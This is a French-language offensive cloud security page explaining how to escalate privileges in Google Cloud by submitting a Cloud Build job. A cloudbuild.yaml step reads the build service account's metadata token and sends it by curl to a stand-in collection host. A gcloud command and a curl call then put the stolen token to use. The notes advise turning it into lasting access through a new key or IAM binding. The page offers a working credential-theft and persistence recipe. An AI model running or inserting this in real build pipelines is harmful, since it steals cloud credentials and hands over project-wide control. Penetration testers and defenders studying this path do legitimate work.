---
title: "Compte de service de build : exfiltrer le jeton Cloud Build pendant le build"
description: "Exfiltrer le jeton du compte de service Cloud Build pendant un build et abuser de ses rôles par défaut à l'échelle du projet."
keywords:
  - Cloud Build
  - jeton de compte de service
  - Editor
  - build
  - élévation de privilèges
---

# Compte de service de build

`cloudbuild.builds.create` vous permet de soumettre un build, et chaque étape de build s'exécute en tant que compte de service Cloud Build. Comme ce compte détient couramment le rôle **Editor** du projet, une étape de build qui lit son propre jeton de métadonnées vous remet une identité quasi administrateur, sans aucun `actAs` requis.

## Exfiltrer le jeton

```yaml
# cloudbuild.yaml: one step that reads the build SA token and ships it out
steps:
  - name: gcr.io/cloud-builders/curl
    entrypoint: bash
    args:
      - -c
      - |
        TOKEN=$(curl -s -H 'Metadata-Flavor: Google' \
          'http://metadata/computeMetadata/v1/instance/service-accounts/default/token')
        curl -s -X POST -d "$TOKEN" https://you.example/collect
```

```bash
gcloud builds submit --config cloudbuild.yaml --no-source
# then use the captured token:
curl -s -H "Authorization: Bearer <access_token>" \
  https://cloudresourcemanager.googleapis.com/v1/projects/<proj>:getIamPolicy -X POST
```

## Notes d'exploitation

- Les rôles effectifs du compte de service Cloud Build déterminent le gain : `gcloud projects get-iam-policy <proj>` confirme s'il porte toujours Editor ou un remplacement à portée restreinte.
- `--no-source` évite de déposer un dépôt ; la configuration en ligne suffit à exécuter l'étape.
- Le jeton capturé est de courte durée, il faut donc l'enchaîner immédiatement vers un accès durable (une clé sur un compte de service cible, ou une liaison IAM ajoutée par vous-même) plutôt que de compter sur le jeton lui-même.
- C'est distinct des chemins de déploiement en tant que compte de service : aucun `iam.serviceAccounts.actAs` n'est nécessaire, seulement la permission de créer un build.

## Outils

- **gcloud** (`builds submit`, `projects get-iam-policy`).

## Références

- [Rhino Security Labs : élévation de privilèges GCP (partie 1)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [Élévation de privilèges IAM GCP (dépôt Rhino)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Hacking the Cloud : GCP](https://hackingthe.cloud/)
